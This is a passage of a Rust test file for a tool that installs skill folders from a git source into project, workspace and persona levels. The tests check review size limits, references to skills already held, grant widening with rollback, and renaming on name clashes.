        install(cx, &source, &Level::project(), &rest.accepted(), None)
    })
    .0
    .unwrap();
    // Every one is installed now: a review of none.
    assert!(
        whole(review_all(root, None, &source, &Level::project()).unwrap())
            .skills
            .is_empty()
    );
}

#[test]
fn a_set_past_one_read_says_which_skills_fit_and_those_install_in_one_part() {
    // Forty instructions of a mebibyte each: listing them reads forty, and one read holds
    // sixty-four, so the review of all of them fits twenty-four.
    let remote = Upstream::new();
    let names: Vec<String> = (0..40).map(|n| format!("s{n:02}")).collect();
    let entries: Vec<(&str, &str, String)> = names
        .iter()
        .map(|name| {
            let mut skill = format!("---\nname: {name}\ndescription: x\n---\n").into_bytes();
            skill.resize(1024 * 1024 - 1, b'x');
            let one = remote.raw_tree(&[("100644", "SKILL.md", remote.blob(&skill))]);
            ("40000", name.as_str(), one)
        })
        .collect();
    let skills = remote.raw_tree(&entries);
    remote.commit(&remote.raw_tree(&[("40000", "skills", skills)]), None);
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();

    let SetReview::TooMuch(too_much) =
        review_set(root, None, &source, &names, &Level::project()).unwrap()
    else {
        panic!("forty mebibytes more is past one read");
    };
    assert_eq!(too_much.fits, names[..24]);
    assert_eq!(too_much.rest, names[24..]);
    assert!(
        too_much.why.contains("MiB of skills to read"),
        "{}",
        too_much.why
    );
    // The same answer for `--all`.
    assert_eq!(
        review_all(root, None, &source, &Level::project()).unwrap(),
        SetReview::TooMuch(too_much.clone())
    );

    // The first part is one review and one install, its files read once.
    let part = whole(review_set(root, None, &source, &too_much.fits, &Level::project()).unwrap());
    assert_eq!(part.skills.len(), 24);
    let (made, _) = on(root, |cx| {
        install(cx, &source, &Level::project(), &part.accepted(), None)
    });
    assert_eq!(made.unwrap().len(), 24);
    // And the rest is what `--all` reviews next.
    let next = whole(review_all(root, None, &source, &Level::project()).unwrap());
    let left: Vec<&str> = next.skills.iter().map(|s| s.name.as_str()).collect();
    assert_eq!(left, too_much.rest);
}

/// #4032: a skill that refers to one the chosen level holds already leaves that one where it is.
/// The review marks it as there, brings it along nowhere, and the install goes ahead without it;
/// at a level that does not hold it, it still comes along.
#[test]
fn a_referred_skill_the_level_holds_already_is_marked_there_and_not_installed_again() {
    let remote = three_skills();
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let project = Level::project();
    let first = review(root, None, &source, &["notify".to_owned()], &project).unwrap();
    on(root, |cx| {
        install(cx, &source, &project, &first.accepted(), None)
    })
    .0
    .unwrap();

    // The single install.
    let deploy = review(root, None, &source, &["deploy".to_owned()], &project).unwrap();
    let names: Vec<&str> = deploy.skills.iter().map(|s| s.name.as_str()).collect();
    assert_eq!(names, ["deploy"]);
    assert_eq!(deploy.skills[0].already, ["notify"]);
    let (made, _) = on(root, |cx| {
        install(cx, &source, &project, &deploy.accepted(), None)
    });
    assert_eq!(made.unwrap().len(), 1);
    let lock = lock::read(root, Kept::Shared).unwrap().lock;
    let held: Vec<(&str, Option<&str>)> = lock
        .skills
        .iter()
        .map(|s| (s.name.as_str(), s.brought_by.as_deref()))
        .collect();
    assert_eq!(held, [("deploy", None), ("notify", None)]);

    // A level that does not hold it brings it along as before.
    let ops = Level::workspace("ops");
    let there = review(root, None, &source, &["deploy".to_owned()], &ops).unwrap();
    let names: Vec<&str> = there.skills.iter().map(|s| s.name.as_str()).collect();
    assert_eq!(names, ["deploy", "notify"]);
    assert!(there.skills[0].already.is_empty());

    // A skill made by hand at the level counts too, and so does Install all…
    std::fs::create_dir_all(root.join("workspaces/ops/skills/notify")).unwrap();
    std::fs::write(root.join("workspaces/ops/skills/notify/SKILL.md"), NOTIFY).unwrap();
    let set = whole(
        review_set(
            root,
            None,
            &source,
            &["deploy".to_owned(), "lint".to_owned()],
            &ops,
        )
        .unwrap(),
    );
    let names: Vec<&str> = set.skills.iter().map(|s| s.name.as_str()).collect();
    assert_eq!(names, ["deploy", "lint"]);
    assert_eq!(set.skills[0].already, ["notify"]);
    let (made, _) = on(root, |cx| install(cx, &source, &ops, &set.accepted(), None));
    assert_eq!(made.unwrap().len(), 2);
    assert_eq!(
        std::fs::read(root.join("workspaces/ops/skills/notify/SKILL.md")).unwrap(),
        NOTIFY,
        "the one made by hand is left as it was"
    );
}

/// #4032: `--all` leaves out a skill the level holds already from anywhere, as its install would
/// be refused, and one that refers to it says it is left as it is.
#[test]
fn installing_all_stops_on_what_the_level_holds() {
    let remote = three_skills();
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let ops = Level::workspace("ops");
    std::fs::create_dir_all(root.join("workspaces/ops/skills/notify")).unwrap();
    std::fs::write(root.join("workspaces/ops/skills/notify/SKILL.md"), NOTIFY).unwrap();

    let all = whole(review_all(root, None, &source, &ops).unwrap());
    let names: Vec<&str> = all.skills.iter().map(|s| s.name.as_str()).collect();
    assert_eq!(names, ["deploy", "lint", "notify"]);
    assert!(all.skills[2].clash.is_some());
}

/// #4153, as the ruling of 2026-11-01 moved it (#4530): one ticked that the chosen level holds,
/// made there by hand or from another source, stops the review. Skipped, the rest install and it
/// is left as it was. Only one installed from this very source is said to be there.
#[test]
fn a_ticked_skill_the_level_holds_is_a_clash_and_skipped_is_left_as_it_was() {
    let remote = three_skills();
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let ops = Level::workspace("ops");
    std::fs::create_dir_all(root.join("workspaces/ops/skills/notify")).unwrap();
    std::fs::write(root.join("workspaces/ops/skills/notify/SKILL.md"), NOTIFY).unwrap();

    let named = ["deploy".to_owned(), "notify".to_owned(), "lint".to_owned()];
    let (set, there) = whole_and_there(review_set(root, None, &source, &named, &ops).unwrap());
    assert!(there.is_empty(), "{there:?}");
    assert!(
        set.skills
            .iter()
            .any(|s| s.name == "notify" && s.clash.is_some())
    );

    let kept = ["deploy".to_owned(), "lint".to_owned()];
    let (set, _) = whole_and_there(review_set(root, None, &source, &kept, &ops).unwrap());
    let names: Vec<&str> = set.skills.iter().map(|s| s.name.as_str()).collect();
    assert_eq!(names, ["deploy", "lint"]);
    assert_eq!(set.skills[0].already, ["notify"]);
    let (made, _) = on(root, |cx| install(cx, &source, &ops, &set.accepted(), None));
    assert_eq!(made.unwrap().len(), 2);
    assert_eq!(
        std::fs::read(root.join("workspaces/ops/skills/notify/SKILL.md")).unwrap(),
        NOTIFY,
        "the one made by hand is left as it was"
    );

    let (again, there) = whole_and_there(review_set(root, None, &source, &kept, &ops).unwrap());
    assert!(again.skills.is_empty(), "{:?}", again.skills);
    assert_eq!(there, kept);
}

/// Writes the skill `notify` into the plane at `root` under `folder`, as a person would by hand.
fn notify_at(root: &Path, folder: &str) {
    std::fs::create_dir_all(root.join(folder).join("notify")).unwrap();
    std::fs::write(root.join(folder).join("notify/SKILL.md"), NOTIFY).unwrap();
}

/// The skills a review of `deploy` at `level` would install, and the references it says are met
/// already.
fn deploy_at(root: &Path, source: &Source, level: &Level) -> (Vec<String>, Vec<String>) {
    let review = review(root, None, source, &["deploy".to_owned()], level).unwrap();
    (
        review.skills.iter().map(|s| s.name.clone()).collect(),
        review.skills[0].already.clone(),
    )
}

/// #4154: a reference is met where every chat that gets the installed skill gets the skill it
/// refers to without it, as a chat resolves its skills. A shared install relies on shared skills
/// alone, which reach every clone; a local install, which runs here alone, on local and shared.
#[test]
fn a_reference_is_met_on_the_side_every_chat_of_the_install_has() {
    let remote = three_skills();
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let both = (vec!["deploy".to_owned(), "notify".to_owned()], Vec::new());
    let met = (vec!["deploy".to_owned()], vec!["notify".to_owned()]);

    // A local notify is this machine's: a shared deploy, which a teammate gets, brings its own.
    notify_at(root, "skills.local");
    assert_eq!(deploy_at(root, &source, &Level::project()), both);
    assert_eq!(deploy_at(root, &source, &Level::project().local(true)), met);

    // A shared notify is in every clone: a local deploy relies on it.
    std::fs::remove_dir_all(root.join("skills.local")).unwrap();
    notify_at(root, "skills");
    let local = Level::project().local(true);
    assert_eq!(deploy_at(root, &source, &local), met);
    let review = review(root, None, &source, &["deploy".to_owned()], &local).unwrap();
    let (made, _) = on(root, |cx| {
        install(cx, &source, &local, &review.accepted(), None)
    });
    assert_eq!(made.unwrap().len(), 1);
    assert!(!root.join("skills.local/notify").exists());
}

/// #4154: at a workspace, a project skill granted to it and not turned off there meets the
/// reference, as its chats get that skill; one not granted to it, or turned off there, does not,
/// and the source's comes along.
#[test]
fn a_project_skill_granted_to_the_workspace_meets_a_reference_there() {
    let remote = three_skills();
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let ops = Level::workspace("ops");
    let both = (vec!["deploy".to_owned(), "notify".to_owned()], Vec::new());
    let met = (vec!["deploy".to_owned()], vec!["notify".to_owned()]);
    notify_at(root, "skills");

    // Granted to the root alone, as a project skill is by default.
    assert_eq!(deploy_at(root, &source, &ops), both);

    crate::skills::grant(root, "notify", &Grant::Only(vec!["ops".into()])).unwrap();
    assert_eq!(deploy_at(root, &source, &ops), met);
    let review = review(root, None, &source, &["deploy".to_owned()], &ops).unwrap();
    let (made, _) = on(root, |cx| {
        install(cx, &source, &ops, &review.accepted(), None)
    });
    assert_eq!(made.unwrap().len(), 1);
    assert!(!root.join("workspaces/ops/skills/notify").exists());

    // Turned off in the workspace: its chats do not get it, so the source's comes along.
    std::fs::remove_dir_all(root.join("workspaces/ops/skills/deploy")).unwrap();
    crate::skills::switch(root, "ops", "notify", false).unwrap();
    assert_eq!(deploy_at(root, &source, &ops), both);
}

/// #4154: at a persona, a project skill its `skills:` list names meets the reference, as the
/// persona brings it into every workspace; a project skill it does not name does not.
#[test]
fn a_project_skill_the_persona_names_meets_a_reference_at_the_persona() {
    let remote = three_skills();
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let steward = Level::persona("steward");
    std::fs::create_dir_all(root.join("personas/steward")).unwrap();
    let persona = |skills: &str| {
        std::fs::write(
            root.join("personas/steward/persona.md"),
            format!("---\nname: steward\nskills: {skills}\n---\n\nKeeps it.\n"),
        )
        .unwrap();
    };
    notify_at(root, "skills");

    persona("lint");
    assert_eq!(
        deploy_at(root, &source, &steward),
        (vec!["deploy".to_owned(), "notify".to_owned()], Vec::new())
    );
    persona("lint, notify");
    assert_eq!(
        deploy_at(root, &source, &steward),
        (vec!["deploy".to_owned()], vec!["notify".to_owned()])
    );
}

/// #4172: a project install granted to workspaces relies on a project skill it refers to only
/// where that skill reaches them. The review names each such skill and the grant the install
/// widens it to, and each workspace that turned it off; the install widens it with the rest.
#[test]
fn a_project_install_with_a_grant_widens_the_grant_of_a_project_skill_it_refers_to() {
    use super::widen::{Widening, widenings};
    let remote = three_skills();
    let tmp = plane();
    let root = tmp.path();
    std::fs::create_dir_all(root.join("workspaces/web")).unwrap();
    let source = remote.source();
    let project = Level::project();
    let only = |names: &[&str]| Grant::Only(names.iter().map(|n| (*n).to_owned()).collect());
    notify_at(root, "skills");
    let review = review(root, None, &source, &["deploy".to_owned()], &project).unwrap();
    assert_eq!(review.skills[0].already, ["notify"]);
    let widen = |grant: Option<&Grant>, level: &Level| {
        widenings(
            root,
            level,
            grant,
            review.skills[0].already.iter().map(String::as_str),
        )
    };
    let one = |granted: Grant, widened: Option<Grant>, turned_off: &[&str]| {
        vec![Widening {
            name: "notify".to_owned(),
            folder: root.join("skills/notify"),
            granted,
            widened,
            turned_off: turned_off.iter().map(|n| (*n).to_owned()).collect(),
        }]
    };

    // The root's grant reaches the root alone, where notify is already; a local install is
    // granted nothing.
    assert_eq!(widen(None, &project), []);
    assert_eq!(widen(Some(&Grant::Root), &project), []);
    assert_eq!(
        widen(Some(&only(&["ops"])), &project.clone().local(true)),
        []
    );

    // notify reaches the root alone: its grant takes in each workspace the install's reaches.
    assert_eq!(
        widen(Some(&only(&["ops"])), &project),
        one(Grant::Root, Some(only(&["ops"])), &[])
    );
    assert_eq!(
        widen(Some(&only(&["ops", "ops"])), &project),
        one(Grant::Root, Some(only(&["ops"])), &[])
    );
    crate::skills::grant(root, "notify", &only(&["web"])).unwrap();
    assert_eq!(
        widen(Some(&only(&["ops", "web"])), &project),
        one(only(&["web"]), Some(only(&["web", "ops"])), &[])
    );
    assert_eq!(widen(Some(&only(&["web"])), &project), []);
    assert_eq!(
        widen(Some(&Grant::All), &project),
        one(only(&["web"]), Some(Grant::All), &[])
    );

    // Granted everywhere already, and turned off in ops: no grant brings it back there.
    crate::skills::grant(root, "notify", &Grant::All).unwrap();
    assert_eq!(widen(Some(&Grant::All), &project), []);
    crate::skills::switch(root, "ops", "notify", false).unwrap();
    assert_eq!(
        widen(Some(&Grant::All), &project),
        one(Grant::All, None, &["ops"])
    );
    assert_eq!(widen(Some(&only(&["web"])), &project), []);
    crate::skills::switch(root, "ops", "notify", true).unwrap();

    // The install widens it with the rest, and says so; notify is left where it is.
    crate::skills::grant(root, "notify", &Grant::Root).unwrap();
    let (made, said) = on(root, |cx| {
        install(
            cx,
            &source,
            &project,
            &review.accepted(),
            Some(&only(&["ops"])),
        )
    });
    assert_eq!(made.unwrap().len(), 1);
    let grant_of = |name: &str| crate::skills::grant_of(&root.join("skills").join(name)).unwrap();
    assert_eq!(grant_of("deploy"), only(&["ops"]));
    assert_eq!(grant_of("notify"), only(&["ops"]));
    assert_eq!(
        std::fs::read(root.join("skills/notify/SKILL.md")).unwrap(),
        NOTIFY
    );
    assert!(
        said.iter()
            .any(|line| line.to_string().contains("notify is granted to ops too")),
        "{said:?}"
    );
}

/// #4186: an update at the project level relies on the project skills it refers to as an
/// install with the updated skill's own grant does. A held one whose grant does not reach the
/// updated skill's workspaces is widened, and a skill it brings along lands with that grant; a
/// local update, or one of a skill granted to the root, grants nothing.
#[cfg(unix)]
#[test]
fn an_update_at_the_project_level_widens_and_grants_as_the_updated_skill_is_granted() {
    use super::widen::Widening;
    let (remote, first) = good_remote();
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let project = Level::project();
    let ops = Grant::Only(vec!["ops".to_owned()]);
    let accepted = review(root, None, &source, &["notify".to_owned()], &project)
        .unwrap()
        .accepted();
    on(root, |cx| {
        install(cx, &source, &project, &accepted, Some(&ops))
    })
    .0
    .unwrap();
    // lint is the project's own, granted to the root alone; the newer notify refers to it and
    // to format, which only the source holds.
    std::fs::create_dir_all(root.join("skills/lint")).unwrap();
    std::fs::write(
        root.join("skills/lint/SKILL.md"),
        b"---\nname: lint\ndescription: Checks it.\n---\n",
    )
    .unwrap();
    let tree = remote.tree(&[
        (
            "skills/notify/SKILL.md",
            "100644",
            b"---\nname: notify\ndescription: Tells the team.\n---\n\nThen skills:format and skills:lint.\n",
        ),
        (
            "skills/format/SKILL.md",
            "100644",
            b"---\nname: format\ndescription: Formats.\n---\n",
        ),
        (
            "skills/lint/SKILL.md",
            "100644",
            b"---\nname: lint\ndescription: Checks it.\n---\n",
        ),
    ]);
    let second = remote.commit(&tree, Some(&first));
    let diff = update_review(root, None, &project, "notify").unwrap();
    assert_eq!(diff.review.already, ["lint"]);
    assert_eq!(diff.grant, Some(ops.clone()));
    assert_eq!(
        diff.widenings,
        [Widening {
            name: "lint".to_owned(),
            folder: root.join("skills/lint"),
            granted: Grant::Root,
            widened: Some(ops.clone()),
            turned_off: Vec::new(),
        }]
    );
    assert_eq!(
        diff.widenings[0].said("update").as_deref(),
        Some(
            "refers to lint, which is granted to root: it is left as it is, and the update \
             grants it to ops too"
        )
    );

    // A later step that fails takes back the grants it wrote with the rest: here notify's own
    // folder, which cannot be written.
    use std::os::unix::fs::PermissionsExt;
    let notify = root.join("skills/notify");
    std::fs::set_permissions(&notify, std::fs::Permissions::from_mode(0o555)).unwrap();
    let (answer, _) = on(root, |cx| {
        update(
            cx,
            &project,
            "notify",
            &diff.accepted(),
            diff.grant.as_ref(),
        )
    });
    std::fs::set_permissions(&notify, std::fs::Permissions::from_mode(0o755)).unwrap();
    assert!(answer.unwrap_err().contains("could not be updated"));
    let grant_of = |name: &str| crate::skills::grant_of(&root.join("skills").join(name)).unwrap();
    assert_eq!(grant_of("lint"), Grant::Root);
    assert!(!root.join("skills/format").exists());
    assert!(!root.join("skills/format.toml").exists());

    // A grant that changed since the review is not the one it showed: nothing is written.
    let (answer, _) = on(root, |cx| {
        update(cx, &project, "notify", &diff.accepted(), Some(&Grant::All))
    });
    assert!(answer.unwrap_err().contains("review it again"));
    assert!(!root.join("skills/format").exists());

    let (answer, said) = on(root, |cx| {
        update(
            cx,
            &project,
            "notify",
            &diff.accepted(),
            diff.grant.as_ref(),
        )
    });
    answer.unwrap();
    assert_eq!(grant_of("format"), ops);
    assert_eq!(grant_of("lint"), ops);
    assert_eq!(grant_of("notify"), ops);
    assert!(
        said.iter()
            .any(|line| line.to_string().contains("lint is granted to ops too")),
        "{said:?}"
    );

    // Granted to the root, or kept on this machine: nothing to widen, nothing granted.
    crate::skills::grant(root, "notify", &Grant::Root).unwrap();
    crate::skills::grant(root, "lint", &Grant::Root).unwrap();
    let tree = remote.tree(&[
        (
            "skills/notify/SKILL.md",
            "100644",
            b"---\nname: notify\ndescription: Tells the team.\n---\n\nThen skills:lint, again.\n",
        ),
        (
            "skills/lint/SKILL.md",
            "100644",
            b"---\nname: lint\ndescription: Checks it.\n---\n",
        ),
    ]);
    remote.commit(&tree, Some(&second));
    let diff = update_review(root, None, &project, "notify").unwrap();
    assert_eq!(diff.grant, None);
    assert_eq!(diff.widenings, []);
}

// ---- a name clash at install (#4530) --------------------------------------------------------

fn clash_remote() -> Upstream {
    let remote = Upstream::new();
    let grilling =
        b"---\nname: grilling\ndescription: Asks hard questions.\n---\n\nSee grilling.\n";
    let tree = remote.tree(&[("skills/grilling/SKILL.md", "100644", grilling)]);
    remote.commit(&tree, None);
    remote
}

fn made_here(root: &Path, name: &str) {
    let folder = root.join("skills").join(name);
    std::fs::create_dir_all(&folder).unwrap();
    std::fs::write(
        folder.join("SKILL.md"),
        format!("---\nname: {name}\ndescription: Made here.\n---\n"),
    )
    .unwrap();
}

fn grilling() -> Vec<String> {
    vec!["grilling".to_owned()]
}

fn to_acme() -> Renames {
    Renames::from([("grilling".to_owned(), "acme-grilling".to_owned())])
}

#[test]
fn a_remotes_label_is_its_owner_or_its_folders_name_spelled_as_a_skill_name() {
    let label = |url: &str| {
        Remote {
            url: url.to_owned(),
            branch: None,
        }
        .label()
    };
    assert_eq!(label("https://github.com/mattpocock/skills"), "mattpocock");
    assert_eq!(label("https://git.example.com"), "git-example-com");
    assert_eq!(label("/home/me/My_Skills.git"), "my-skills");
}

#[test]
fn the_review_stops_on_a_name_the_level_holds_and_offers_the_sources_name() {
    let remote = clash_remote();
    let tmp = plane();
    made_here(tmp.path(), "grilling");
    let reviewed = review(
        tmp.path(),
        None,
        &remote.source(),
        &grilling(),
        &Level::project(),
    )
    .unwrap();
    let clash = reviewed.skills[0].clash.as_ref().unwrap();
    assert_eq!(
        clash.held_by,
        "the project skills have a grilling made here"
    );
    assert!(clash.offered.ends_with("-grilling"), "{}", clash.offered);
}

#[test]
fn a_copy_at_another_level_gets_one_line_and_no_stop() {
    let remote = clash_remote();
    let tmp = plane();
    made_here(tmp.path(), "grilling");
    let reviewed = review(
        tmp.path(),
        None,
        &remote.source(),
        &grilling(),
        &Level::workspace("ops"),
    )
    .unwrap();
    assert_eq!(reviewed.skills[0].clash, None);
    assert_eq!(
        reviewed.skills[0].notes.len(),
        1,
        "{:?}",
        reviewed.skills[0].notes
    );
    assert!(reviewed.skills[0].notes[0].contains("narrowest copy"));
}

#[test]
fn a_new_name_changes_only_the_name_line_and_folder_and_the_record_keeps_the_sources_name() {
    let remote = clash_remote();
    let tmp = plane();
    let root = tmp.path();
    made_here(root, "grilling");
    let source = remote.source();
    let level = Level::project();
    let accepted = review(root, None, &source, &grilling(), &level)
        .unwrap()
        .accepted();
    on(root, |cx| {
        install_named(cx, &source, &level, &accepted, None, &to_acme())
    })
    .0
    .unwrap();

    assert_eq!(
        std::fs::read_to_string(root.join("skills/acme-grilling/SKILL.md")).unwrap(),
        "---\nname: acme-grilling\ndescription: Asks hard questions.\n---\n\nSee grilling.\n"
    );
    assert!(
        std::fs::read_to_string(root.join("skills/grilling/SKILL.md"))
            .unwrap()
            .contains("Made here")
    );
    let lock = lock::read(root, Kept::Shared).unwrap().lock;
    assert_eq!(lock.skills[0].name, "acme-grilling");
    assert_eq!(lock.skills[0].at_source(), "grilling");
}

#[test]
fn a_copy_under_a_new_name_is_not_edited_and_its_update_finds_it_by_its_name_at_the_source() {
    let remote = Upstream::new();
    let one = b"---\nname: grilling\ndescription: One.\n---\n\nFirst.\n";
    let first = remote.tree(&[("skills/grilling/SKILL.md", "100644", one)]);
    let parent = remote.commit(&first, None);
    let tmp = plane();
    let root = tmp.path();
    made_here(root, "grilling");
    let source = remote.source();
    let level = Level::project();
    let accepted = review(root, None, &source, &grilling(), &level)
        .unwrap()
        .accepted();
    on(root, |cx| {
        install_named(cx, &source, &level, &accepted, None, &to_acme())
    })
    .0
    .unwrap();

    let two = b"---\nname: grilling\ndescription: Two.\n---\n\nSecond.\n";
    let second = remote.tree(&[("skills/grilling/SKILL.md", "100644", two)]);
    remote.commit(&second, Some(&parent));

    let offers = updates(root).offers;
    assert_eq!(offers[0].name, "acme-grilling");
    assert!(!offers[0].edited, "the new name is not an edit");
    let shown = update_review(root, None, &level, "acme-grilling").unwrap();
    assert!(shown.edited.is_empty(), "{:?}", shown.edited);
    assert!(
        shown
            .files
            .iter()
            .all(|file| !file.diff.contains("acme-grilling")),
        "{:?}",
        shown.files
    );
    on(root, |cx| {
        update(cx, &level, "acme-grilling", &shown.accepted(), None)
    })
    .0
    .unwrap();
    assert_eq!(
        std::fs::read_to_string(root.join("skills/acme-grilling/SKILL.md")).unwrap(),
        "---\nname: acme-grilling\ndescription: Two.\n---\n\nSecond.\n"
    );
    assert!(updates(root).offers.is_empty());
}

#[test]
fn a_new_name_that_is_taken_or_not_a_name_installs_nothing() {
    let remote = clash_remote();
    let tmp = plane();
    let root = tmp.path();
    made_here(root, "grilling");
    made_here(root, "taken");
    let source = remote.source();
    let level = Level::project();
    let accepted = review(root, None, &source, &grilling(), &level)
        .unwrap()
        .accepted();
    for bad in ["taken", "Not A Name"] {
        let renames = Renames::from([("grilling".to_owned(), bad.to_owned())]);
        let said = on(root, |cx| {
            install_named(cx, &source, &level, &accepted, None, &renames)
        })
        .0;
        assert!(said.is_err(), "{bad}");
    }
    assert!(
        lock::read(root, Kept::Shared)
            .unwrap()
            .lock
            .skills
            .is_empty()
    );
}

#[test]
fn the_review_warns_of_a_skill_it_refers_to_that_is_another_sources_here() {
    let theirs = clash_remote();
    let tmp = plane();
    let root = tmp.path();
    let level = Level::project();
    let accepted = review(root, None, &theirs.source(), &grilling(), &level)
        .unwrap()
        .accepted();
    on(root, |cx| {
        install(cx, &theirs.source(), &level, &accepted, None)
    })
    .0
    .unwrap();

    let ours = Upstream::new();
    let release = b"---\nname: release\ndescription: Ships.\n---\n\nUse skills:grilling.\n";
    let tree = ours.tree(&[("skills/release/SKILL.md", "100644", release)]);
    ours.commit(&tree, None);
    let reviewed = review(root, None, &ours.source(), &["release".to_owned()], &level).unwrap();
    assert_eq!(reviewed.skills[0].already, ["grilling"]);
    assert!(
        reviewed.skills[0]
            .notes
            .iter()
            .any(|line| line.starts_with("It refers to grilling, which is ")),
        "{:?}",
        reviewed.skills[0].notes
    );
}

#[test]
fn the_warning_stands_where_the_skill_it_refers_to_is_being_renamed_in_the_same_install() {
    let theirs = clash_remote();
    let tmp = plane();
    let root = tmp.path();
    let level = Level::project();
    let accepted = review(root, None, &theirs.source(), &grilling(), &level)
        .unwrap()
        .accepted();
    on(root, |cx| {
        install(cx, &theirs.source(), &level, &accepted, None)
    })
    .0
    .unwrap();

    let ours = Upstream::new();
    let release = b"---\nname: release\ndescription: Ships.\n---\n\nUse skills:grilling.\n";
    let own = b"---\nname: grilling\ndescription: Ours.\n---\n";
    let tree = ours.tree(&[
        ("skills/release/SKILL.md", "100644", release),
        ("skills/grilling/SKILL.md", "100644", own),
    ]);
    ours.commit(&tree, None);
    let named = ["release".to_owned(), "grilling".to_owned()];
    let (set, _) = whole_and_there(review_set(root, None, &ours.source(), &named, &level).unwrap());
    let release = set.skills.iter().find(|s| s.name == "release").unwrap();
    assert!(
        release
            .notes
            .iter()
            .any(|line| line.starts_with("It refers to grilling, which is ")),
        "{:?}",
        release.notes
    );
}

#[test]
fn a_clash_lists_the_built_in_names_a_new_name_cannot_take() {
    let remote = clash_remote();
    let tmp = plane();
    made_here(tmp.path(), "grilling");
    let reviewed = review(
        tmp.path(),
        None,
        &remote.source(),
        &grilling(),
        &Level::project(),
    )
    .unwrap();
    let clash = reviewed.skills[0].clash.as_ref().unwrap();
    assert!(clash.taken.iter().any(|name| name == "grilling"));
    assert!(
        clash.taken.iter().any(|name| name == "secrets"),
        "{:?}",
        clash.taken
    );
}

#[test]
fn a_persona_skill_from_a_source_carries_its_label_in_the_personas_rows() {
    let remote = clash_remote();
    let tmp = plane();
    let root = tmp.path();
    std::fs::create_dir_all(root.join("personas/ada/skills")).unwrap();
    std::fs::write(
        root.join("personas/ada/persona.md"),
        "---\nrole: Ada\n---\n",
    )
    .unwrap();
    let level = Level::persona("ada");
    let source = remote.source();
    let accepted = review(root, None, &source, &grilling(), &level)
        .unwrap()
        .accepted();
    on(root, |cx| install(cx, &source, &level, &accepted, None))
        .0
        .unwrap();

    let personas = crate::skills::persona_rows(None, root);
    let row = personas
        .iter()
        .flat_map(|one| &one.rows)
        .find(|row| row.name == "grilling")
        .unwrap();
    assert_eq!(row.source_label, Some(source.remote.label()));
}
